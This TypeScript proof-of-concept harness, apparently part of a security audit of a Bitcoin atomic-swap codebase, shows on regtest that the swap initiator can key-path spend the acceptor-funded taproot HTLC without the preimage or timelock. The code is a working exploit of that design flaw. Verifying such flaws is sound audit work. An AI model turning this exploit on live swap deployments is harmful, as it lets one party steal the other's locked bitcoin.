// Harness: can the INITIATOR key-path spend the acceptor-funded HTLC (no preimage, no timelock)?
import { ECPairFactory } from 'ecpair';
import * as ecc from 'tiny-secp256k1';
import * as bitcoin from 'bitcoinjs-lib';
import { PureBitcoinSwap } from './src/lib/PureBitcoinSwap';

bitcoin.initEccLib(ecc);
const ECPair = ECPairFactory(ecc);
const network = bitcoin.networks.regtest;

// Roles: initiator (attacker), acceptor (victim)
const initiator = ECPair.makeRandom({ network });
const acceptor = ECPair.makeRandom({ network });
const hashLock = bitcoin.crypto.sha256(Buffer.from('attacker-unknown-preimage-is-fine'));
const lockTime = 500;

// EXACT server-side construction (server.ts:898-901):
// internal key = offer.initiatorPubKey
const htlc = PureBitcoinSwap.createTaprootHtlc(
    Buffer.from(initiator.publicKey), hashLock,
    Buffer.from(initiator.publicKey),   // recipient (for the second/acceptor-funded HTLC)
    Buffer.from(acceptor.publicKey),    // refund
    lockTime, network
);
console.log('HTLC address:', htlc.address);

// Fake funding output: 100_000 sats locked in the acceptor-funded HTLC
const fundAmount = 100_000n;
const fakePrevTx = new bitcoin.Transaction();
fakePrevTx.version = 2;
fakePrevTx.addInput(Buffer.alloc(32, 1), 0);
fakePrevTx.addOutput(bitcoin.address.toOutputScript(htlc.address!, network), fundAmount);
const fundTxid = fakePrevTx.getId();

// Attacker (initiator) computes the key-path tweaked private key from THEIR OWN key.
// Need the merkle root of the script tree — reconstruct the same tree to get it.
const claimScript = (PureBitcoinSwap as any).createHtlcClaimScript(hashLock, Buffer.from(initiator.publicKey));
const refundScript = (PureBitcoinSwap as any).createHtlcRefundScript(Buffer.from(acceptor.publicKey), lockTime);
const tree = [
    { output: new Uint8Array(claimScript) },
    { output: new Uint8Array(refundScript) }
];
// bitcoinjs taproot merkle root via p2tr internals:
const p2tr = bitcoin.payments.p2tr({
    internalPubkey: PureBitcoinSwap.getXOnlyPubKey(Buffer.from(initiator.publicKey)),
    scriptTree: tree as any,
    network
});
// Recompute merkle root: use payments to extract witness/ redeem? Simplest: hash the two tapleafs.
const leafA = PureBitcoinSwap.tapleafHash(claimScript);
const leafB = PureBitcoinSwap.tapleafHash(refundScript);
const [first, second] = Buffer.compare(leafA, leafB) < 0 ? [leafA, leafB] : [leafB, leafA];
const merkleRoot = Buffer.from(bitcoin.crypto.taggedHash('TapBranch', Buffer.concat([first, second])));

const tweaked = PureBitcoinSwap.getTweakedKeyPair(initiator, merkleRoot, network);

// Build key-path spend via Psbt (tapInternalKey, no script path)
const psbt = new bitcoin.Psbt({ network });
psbt.addInput({
    hash: fundTxid,
    index: 0,
    witnessUtxo: { script: bitcoin.address.toOutputScript(htlc.address!, network), value: fundAmount },
    tapInternalKey: PureBitcoinSwap.getXOnlyPubKey(Buffer.from(initiator.publicKey))
});
const dest = bitcoin.payments.p2tr({ internalPubkey: PureBitcoinSwap.getXOnlyPubKey(Buffer.from(acceptor.publicKey)), network });
psbt.addOutput({ address: dest.address!, value: fundAmount - 1000n });

// Sign with the tweaked initiator key as a taproot key-path signer
const tweakedSigner = {
    publicKey: Buffer.from(tweaked.publicKey),
    signSchnorr: (hash: Buffer) => Buffer.from((tweaked as any).signSchnorr(hash))
} as any;

try {
    psbt.signInput(0, tweakedSigner);
    psbt.finalizeInput(0);
    const tx = psbt.extractTransaction();
    const witness = tx.ins[0].witness;
    console.log('KEY-PATH SPEND FINALIZED. txid:', tx.getId());
    console.log('witness items:', witness.length, 'sig len:', witness[0]?.length);

    // Independently verify the Schnorr signature against the real taproot sighash
    const sighash = tx.hashForWitnessV1(
        0,
        [bitcoin.address.toOutputScript(htlc.address!, network)],
        [fundAmount],
        bitcoin.Transaction.SIGHASH_DEFAULT
    );
    const sig = witness[0].subarray(0, 64);
    const xOnlyTweaked = PureBitcoinSwap.getXOnlyPubKey(Buffer.from(tweaked.publicKey));
    const ok = ecc.verifySchnorr(sighash, p2tr.pubkey!, sig);
    console.log('Output pubkey (tweaked):', Buffer.from(p2tr.pubkey!).toString('hex'));
    console.log('Schnorr sig verifies against tweaked output key:', ok);
    console.log('CONCLUSION:', ok
        ? 'CONFIRMED — initiator can key-path spend the acceptor-funded HTLC at any time, no preimage, no timelock.'
        : 'signature did not verify');
} catch (e: any) {
    console.log('KEY-PATH SPEND FAILED:', e.message);
}
